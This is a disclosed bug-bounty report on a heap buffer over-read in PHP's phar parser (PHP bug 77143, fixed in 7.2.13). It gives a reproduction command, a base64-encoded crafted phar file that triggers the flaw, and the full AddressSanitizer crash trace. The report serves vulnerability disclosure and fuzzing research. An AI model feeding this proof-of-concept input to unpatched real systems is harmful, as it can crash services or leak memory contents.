# Heap Buffer Overflow (READ: 4) in phar_parse_pharfile

## Report Details
- **Report ID**: 477344
- **URL**: https://hackerone.com/reports/477344
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-01-09T22:03:25.780Z
- **Disclosed**: 2020-10-10T01:00:02.500Z

## Reporter
- **Username**: cy1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Phar files with __HALT_COMPILER(); in unexpected places can lead to a buffer overrun. This is something I found while fuzzing with AFL using an ASAN instrumented PHP.

The issue can be observed by disabling the ZEND allocator and using ASAN (or valgrind/etc?) with a crafted phar as input. I have prepared an example PHAR file *php-oob4.phar*
```
USE_ZEND_ALLOC=0 php -d phar.readonly=0 -r "var_dump(new Phar('php-oob4.phar',0,'project.phar'));"
```
Base64 encoding of *php-oob4.phar* is as follows:
```
X19IQUxUX0NPTVBJTEVSKCk7CgAAANQpRbJAlS4oDzkKFD1B2bK4fX3DAgAAAEdCTUI=
```

OUTPUT
====
The following ASAN report was generated from this test case:
```
=================================================================
==2741==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ab7a at pc 0x0000013258a7 bp 0x7ffd845ab330 sp 0x7ffd845ab328
READ of size 4 at 0x60200000ab7a thread T0
    #0 0x13258a6 in phar_parse_pharfile /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2
    #1 0x13258a6 in phar_open_from_fp /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1708
    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7
    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9
    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6
    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4
    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7
    #7 0x1c15f56 in zend_execute /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:63776:2
    #8 0x1a07225 in zend_eval_stringl /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1083:4
    #9 0x1a07d6a in zend_eval_stringl_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1124:11
    #10 0x1a07d6a in zend_eval_string_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1135
    #11 0x200c501 in do_cli /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1042:8
    #12 0x200960c in main /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1404:18
    #13 0x7f21462e082f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
    #14 0x43a598 in _start (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x43a598)

0x60200000ab7a is located 0 bytes to the right of 10-byte region [0x60200000ab70,0x60200000ab7a)
allocated by thread T0 here:
    #0 0x4da6c8 in __interceptor_malloc (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x4da6c8)
    #1 0x192899c in __zend_malloc /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_alloc.c:2829:14
    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7
    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9
    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6
    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4
    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2 in phar_parse_pharfile
Shadow bytes around the buggy address:
  0x0c047fff9510: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9520: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9530: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9540: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9550: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c047fff9560: fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00[02]
  0x0c047fff9570: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 02 fa
  0x0c047fff9580: fa fa fd fa fa fa 00 00 fa fa 00 fa fa fa 00 05
  0x0c047fff9590: fa fa fd fa fa fa 00 05 fa fa fd fa fa fa 00 04
  0x0c047fff95a0: fa fa fd fa fa fa 00 fa fa fa fd fd fa fa fd fd
  0x0c047fff95b0: fa fa fd fd fa fa fd fd fa fa fd fa fa fa 00 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2741==ABORTING
```

## Impact

A context dependent attacker can trigger unsafe memory access. This may reveal information, affect availability, or be used as part of an exploit chain.

This was tracked as [PHP bug 77143](https://bugs.php.net/bug.php?id=77143)
PHP released fixes for supported affected versions on December 6 2018 as noted in their [changelog](http://php.net/ChangeLog-7.php#7.2.13).

## Attachments
No attachments
